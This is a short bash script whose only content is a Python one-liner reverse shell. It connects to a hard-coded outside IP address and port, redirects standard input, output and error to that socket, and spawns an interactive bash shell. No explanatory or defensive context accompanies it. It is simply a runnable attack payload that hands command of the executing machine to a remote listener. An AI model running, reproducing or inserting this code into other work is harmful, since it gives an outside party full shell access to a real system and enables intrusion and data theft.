#!/bin/bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("31.169.66.221",45231));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
